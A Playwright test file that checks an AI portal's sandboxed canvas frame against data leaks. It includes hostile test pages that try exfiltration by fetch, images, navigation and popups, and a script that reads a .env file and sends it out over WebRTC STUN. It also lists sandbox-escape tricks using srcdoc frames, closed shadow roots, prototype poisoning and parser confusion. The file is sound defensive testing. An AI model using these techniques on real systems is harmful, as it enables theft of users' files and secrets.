// What an agent-drawn page can reach from inside the portal. A canvas app may
// read the session's files, so every way out of the frame is a way out for
// that data:
//
//   it cannot fetch, load remote images, or navigate its frame elsewhere
//   it cannot open a window by itself
//   a link it offers opens only after the person sees the destination
//   it cannot reach a STUN server through WebRTC, even by replacing itself
//   with a page it built
//   no prolog it writes gets ahead of the portal's policy
//   the public share viewer applies the same rules
//
// "Outside" is http://localhost:<port>, a different origin from the portal at
// 127.0.0.1, so every leak attempt would reach the stub if it got out.
import dgram from "node:dgram";
import { test, expect } from "@playwright/test";
import { startStubServer } from "./stub-server.mjs";

const sessionId = "11111110-2222-3333-4444-555555555550";
let stub;
test.beforeAll(async () => { stub = await startStubServer(0, { sessionCount: 1 }); });
test.afterAll(async () => { await new Promise((resolve) => stub.server.close(resolve)); });

const outside = () => `http://localhost:${stub.port}`;

const hostilePage = () => `<!doctype html>
<html><body>
<p id="state">ready</p>
<img id="pic" src="${outside()}/leak/img?d=secret" alt="">
<a id="link" href="https://example.com/report?d=secret" target="_blank">Open the report</a>
<button id="fetch" type="button">Fetch</button>
<button id="popup" type="button">Popup</button>
<button id="nav" type="button">Navigate</button>
<script>
const state = document.getElementById("state");
document.getElementById("fetch").onclick = () => fetch("${outside()}/leak/fetch?d=secret").then(() => { state.textContent = "fetched"; }, () => { state.textContent = "fetch blocked"; });
document.getElementById("popup").onclick = () => { const w = window.open("https://example.com/popup?d=secret"); state.textContent = w ? "popup opened" : "popup asked"; };
document.getElementById("nav").onclick = () => { location.href = "${outside()}/leak/nav?d=secret"; };
</script>
</body></html>`;

// A request the policy refuses never reaches the network, so only requests
// that escaped it land here. (The browser still reports a refused attempt as
// a request that failed with "csp"; that is the policy working.)
async function watchLeaks(page) {
    const leaks = [];
    await page.context().route(`${outside()}/leak/**`, (route) => {
        leaks.push(route.request().url());
        return route.fulfill({ status: 204 });
    });
    return leaks;
}

async function openCanvas(page, html) {
    await page.route("**/api/v1/**", async (route) => {
        const url = new URL(route.request().url());
        if (url.pathname.endsWith("/events-before") && url.search.includes("session.canvas_updated")) {
            return route.fulfill({ json: { ok: true, result: [{ seq: 1, eventType: "session.canvas_updated", data: { slot: 1, rev: 1, sizeBytes: html.length, name: "hostile" } }] } });
        }
        if (url.pathname.includes("/artifacts/") && url.pathname.includes("canvas.html")) {
            return route.fulfill({ contentType: "text/html", body: html });
        }
        return route.fallback();
    });
    await page.goto(`http://127.0.0.1:${stub.port}/?session=${sessionId}`);
    const show = page.getByRole("button", { name: "Show canvas", exact: true });
    await show.or(page.getByRole("button", { name: "Hide the canvas", exact: true })).first().waitFor();
    if (await show.isVisible()) await show.click();
    const frame = page.frameLocator(".ps-side-pane-layer:not(.is-parked) iframe.ps-html-preview-frame:not(.is-staging)");
    await expect(frame.locator("#state")).toHaveText("ready");
    return frame;
}

test("a canvas cannot fetch, load remote images, or open windows on its own", async ({ page }) => {
    const leaks = await watchLeaks(page);
    const frame = await openCanvas(page, hostilePage());
    await frame.getByRole("button", { name: "Fetch" }).click();
    await expect(frame.locator("#state")).toHaveText("fetch blocked");
    const popups = [];
    page.context().on("page", (p) => popups.push(p.url()));
    await frame.getByRole("button", { name: "Popup" }).click();
    await expect(frame.locator("#state")).toHaveText("popup asked");
    // The request reaches the person as a prompt; nothing opened by itself.
    await expect(page.getByRole("dialog", { name: /This page wants to open/ })).toContainText("https://example.com/popup?d=secret");
    expect(popups).toEqual([]);
    expect(leaks).toEqual([]);
});

test("a canvas cannot navigate its own frame to an outside address", async ({ page }) => {
    const leaks = await watchLeaks(page);
    const frame = await openCanvas(page, hostilePage());
    await frame.getByRole("button", { name: "Navigate" }).click();
    await page.waitForTimeout(500);
    expect(leaks).toEqual([]);
});

test("a link opens only after the person sees where it goes", async ({ page }) => {
    const frame = await openCanvas(page, hostilePage());
    const popups = [];
    page.context().on("page", (p) => popups.push(p));
    await frame.getByRole("link", { name: "Open the report" }).click();
    const prompt = page.getByRole("dialog", { name: /This page wants to open/ });
    await expect(prompt).toContainText("https://example.com/report?d=secret");
    await prompt.getByRole("button", { name: "Cancel" }).click();
    await expect(prompt).toHaveCount(0);
    expect(popups).toEqual([]);

    await page.route("https://example.com/**", (route) => route.fulfill({ contentType: "text/html", body: "<p>outside</p>" }));
    await page.waitForTimeout(1600); // a page waits a moment before asking again
    await frame.getByRole("link", { name: "Open the report" }).click();
    const [opened] = await Promise.all([
        page.context().waitForEvent("page"),
        prompt.getByRole("button", { name: "Open in a new tab" }).click(),
    ]);
    expect(opened.url()).toBe("https://example.com/report?d=secret");
    // Opened without a reference back to the portal.
    expect(await opened.evaluate(() => window.opener)).toBeNull();
});

test("the public share viewer applies the same rules", async ({ page }) => {
    const leaks = await watchLeaks(page);
    await page.route("**/api/canvas-share/live?*", (route) => route.fulfill({ json: { live: { seq: 1, docRev: 1, payload: {} } } }));
    await page.route("**/api/canvas-share/doc?*", (route) => route.fulfill({ contentType: "text/html", body: hostilePage() }));
    await page.goto(`http://127.0.0.1:${stub.port}/?canvasShare=tok`);
    const frame = page.frameLocator("iframe.ps-share-view-frame");
    await expect(frame.locator("#state")).toHaveText("ready");
    await frame.getByRole("button", { name: "Fetch" }).click();
    await expect(frame.locator("#state")).toHaveText("fetch blocked");
    await frame.getByRole("link", { name: "Open the report" }).click();
    await expect(page.getByRole("dialog", { name: /This page wants to open/ })).toContainText("https://example.com/report?d=secret");
    await frame.getByRole("button", { name: "Navigate" }).click();
    await page.waitForTimeout(500);
    expect(leaks).toEqual([]);
});

test("a canvas cannot reach a STUN server through WebRTC", async ({ page }) => {
    // CSP does not govern WebRTC in Chromium; ICE gathering against a STUN
    // server would carry data out in the server's name or the packets.
    const stun = dgram.createSocket("udp4");
    let packets = 0;
    stun.on("message", () => { packets += 1; });
    await new Promise((resolve) => stun.bind(0, "127.0.0.1", resolve));
    try {
        const html = `<!doctype html><p id="state">ready</p><button id="rtc" type="button">Call</button><script>
document.getElementById("rtc").onclick = async () => {
  const s = document.getElementById("state");
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stun.address().port}" }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    s.textContent = "gathering";
  } catch (e) { s.textContent = "no webrtc"; }
};
</script>`;
        const frame = await openCanvas(page, html);
        await frame.getByRole("button", { name: "Call" }).click();
        await expect(frame.locator("#state")).toHaveText("no webrtc");
        await page.waitForTimeout(1500);
        expect(packets).toBe(0);
    } finally {
        stun.close();
    }
});

test("no prolog the page writes gets ahead of the portal's policy", async ({ page }) => {
    const leaks = await watchLeaks(page);
    // An HTML comment that a regex reads as open and the parser reads as
    // closed, then script that would swallow anything after it.
    const html = `<!--><script>document.write("<p id=state>ready</p><img src='${outside()}/leak/prolog'>")</script><!--x--><!doctype html><p>after</p>`;
    const frame = await openCanvas(page, html);
    await expect(frame.locator("#state")).toHaveText("ready");
    await page.waitForTimeout(500);
    expect(leaks).toEqual([]);
});

test("a destination under review cannot be swapped, and focus starts on Cancel", async ({ page }) => {
    const html = `<!doctype html><p id="state">ready</p>
<a id="good" href="https://docs.example/guide">Guide</a>
<a id="sneaky" href="https://trusted.example@attacker.example/x">Trusted</a>
<script>document.getElementById("good").addEventListener("click", () => setTimeout(() => window.open("https://attacker.example/swap"), 50));</script>`;
    const frame = await openCanvas(page, html);
    await frame.getByRole("link", { name: "Guide" }).click();
    const prompt = page.getByRole("dialog", { name: /This page wants to open/ });
    await expect(prompt).toContainText("docs.example");
    await page.waitForTimeout(300);
    await expect(prompt).toContainText("https://docs.example/guide");
    await expect(prompt).not.toContainText("attacker.example");
    await expect(prompt.getByRole("button", { name: "Cancel" })).toBeFocused();

    // Blocking stops every later request from this page.
    await prompt.getByRole("button", { name: "Block links from this page" }).click();
    await expect(prompt).toHaveCount(0);
    await page.waitForTimeout(1600);
    await frame.getByRole("link", { name: "Guide" }).click();
    await page.waitForTimeout(300);
    await expect(prompt).toHaveCount(0);
});

test("a link that hides its host behind a user name is never offered", async ({ page }) => {
    const html = `<!doctype html><p id="state">ready</p><a href="https://trusted.example@attacker.example/x">Trusted</a>`;
    const frame = await openCanvas(page, html);
    await frame.getByRole("link", { name: "Trusted" }).click();
    await page.waitForTimeout(300);
    await expect(page.getByRole("dialog", { name: /This page wants to open/ })).toHaveCount(0);
});

test("a canvas cannot replace itself with a page it built to get WebRTC back", async ({ page }) => {
    const stun = dgram.createSocket("udp4");
    let packets = 0;
    stun.on("message", () => { packets += 1; });
    await new Promise((resolve) => stun.bind(0, "127.0.0.1", resolve));
    const port = stun.address().port;
    try {
        // Positive control: outside any canvas, the same WebRTC call reaches
        // the listener, so a zero below means blocked, not unobserved.
        await page.goto(`http://127.0.0.1:${stub.port}/?session=${sessionId}`);
        await page.evaluate(async (p) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${p}` }] });
            pc.createDataChannel("x");
            await pc.setLocalDescription(await pc.createOffer());
            await new Promise((r) => setTimeout(r, 1500));
            pc.close();
        }, port);
        expect(packets, "control: the listener hears an unprotected page").toBeGreaterThan(0);
        packets = 0;

        // The attack: read a file through the canvas bridge, put it in a page
        // with fresh WebRTC, and navigate the canvas frame to that page.
        await page.route("**/canvas-workspace", (route) => route.fulfill({ json: { ok: true, result: { path: "work/.env", contentBase64: Buffer.from("TOKEN=secret").toString("base64"), size: 12, etag: "e" } } }));
        const attacker = `
const code = "(async()=>{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${port}'}]});pc.createDataChannel(location.hash);await pc.setLocalDescription(await pc.createOffer());})()";
const ask = (id, msg) => new Promise((resolve) => { addEventListener("message", function on(e) { if (e.data && e.data.id === id) { removeEventListener("message", on); resolve(e.data); } }); parent.postMessage({ type: "canvas-ws", id, ...msg }, "*"); });
document.getElementById("go").onclick = async () => {
  const read = await ask("r1", { op: "read", path: "work/.env" });
  const page = "<script>" + code + "</scr" + "ipt>";
  location.replace(URL.createObjectURL(new Blob([page], { type: "text/html" })) + "#" + encodeURIComponent(read.result ? read.result.contentBase64 : "none"));
};`;
        const html = `<!doctype html><p id="state">ready</p><button id="go" type="button">Go</button><script>${attacker}</script>`;
        await page.unroute("**/api/v1/**");
        const frame = await openCanvas(page, html);
        await frame.getByRole("button", { name: "Go" }).click();
        await page.waitForTimeout(2000);
        expect(packets, "the built page never ran WebRTC").toBe(0);
    } finally {
        stun.close();
    }
});

// Ways a page could reach a window that never had WebRTC removed. Each one
// runs a STUN call there; none may produce a packet. Without the wrapper the
// nested srcdoc, the closed shadow root and the declared shadow root all
// reach the server. Using a new frame's window directly (including window[0])
// is already refused by the browser, because each sandboxed document gets its
// own opaque origin; those cases stay here so a browser change is noticed.
const FRESH_CONTEXTS = {
    "a nested srcdoc frame it builds": (call) => `const f = document.createElement("iframe"); f.srcdoc = "<script>" + ${JSON.stringify(call("window"))} + "</scr" + "ipt>"; document.body.appendChild(f);`,
    "a new frame's window, used at once": (call) => `const f = document.createElement("iframe"); document.body.appendChild(f); const W = f.contentWindow; ${call("W")}`,
    "window[0], used at once": (call) => `document.body.appendChild(document.createElement("iframe")); const W = window[0]; ${call("W")}`,
    "a frame inside a closed shadow root": (call) => `const host = document.createElement("div"); document.body.appendChild(host); const root = host.attachShadow({ mode: "closed" }); const f = document.createElement("iframe"); f.srcdoc = "<script>" + ${JSON.stringify(call("window"))} + "</scr" + "ipt>"; root.appendChild(f);`,
    "a frame parsed into a declarative closed shadow root": () => "",
    "a declarative closed shadow root behind a fake template in a comment": () => "",
    "a nested srcdoc frame, after poisoning the methods the guard uses": (call) => `Array.prototype.forEach = function () {}; Element.prototype.remove = function () {}; Element.prototype.matches = function () { return false; }; Element.prototype.querySelectorAll = function () { return []; }; NodeList.prototype.item = function () { return null; }; Reflect.apply = function () {}; Function.prototype.call = function () {}; const f = document.createElement("iframe"); f.srcdoc = "<script>" + ${JSON.stringify(call("window"))} + "</scr" + "ipt>"; document.body.appendChild(f);`,
    "a frame in a closed shadow root, after poisoning the methods the guard uses": (call) => `Array.prototype.forEach = function () {}; Element.prototype.remove = function () {}; DocumentFragment.prototype.querySelectorAll = function () { return []; }; MutationObserver.prototype.observe = function () {}; const host = document.createElement("div"); document.body.appendChild(host); const root = host.attachShadow({ mode: "closed" }); const f = document.createElement("iframe"); f.srcdoc = "<script>" + ${JSON.stringify(call("window"))} + "</scr" + "ipt>"; root.appendChild(f);`,
    "shadow markup set at run time": (call) => `const host = document.createElement("div"); document.body.appendChild(host); host.setHTMLUnsafe('<template shadowrootmode="closed"><iframe></iframe></template>'); setTimeout(() => { const W = window[0]; if (W) { ${call("W")} } }, 300);`,
};

for (const [name, attack] of Object.entries(FRESH_CONTEXTS)) {
    test(`a canvas cannot get WebRTC back through ${name}`, async ({ page }) => {
        const stun = dgram.createSocket("udp4");
        let packets = 0;
        stun.on("message", () => { packets += 1; });
        await new Promise((resolve) => stun.bind(0, "127.0.0.1", resolve));
        const port = stun.address().port;
        const call = (W) => `(async () => { const pc = new ${W}.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${port}" }] }); pc.createDataChannel("secret"); await pc.setLocalDescription(await pc.createOffer()); })().catch(() => {});`;
        try {
            // The frame in a declared closed shadow root runs its own code
            // as soon as it loads; without the wrapper it reaches the server.
            const childScript = `<script>${call("window")}</scr` + "ipt>";
            const declared = `<div><template shadowrootmode="closed"><iframe srcdoc="${childScript.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe></template></div>`;
            const declarative = name.includes("behind a fake template")
                ? `<!-- <template x=" -->\n${declared}`
                : name.includes("declarative") ? declared : "";
            const html = `<!doctype html><p id="state">ready</p>${declarative}<button id="go" type="button">Go</button><script>document.getElementById("go").onclick = () => { try { ${attack(call)} } catch (e) {} };</script>`;
            const frame = await openCanvas(page, html);
            await frame.getByRole("button", { name: "Go" }).click();
            await page.waitForTimeout(2000);
            expect(packets).toBe(0);
        } finally {
            stun.close();
        }
    });
}
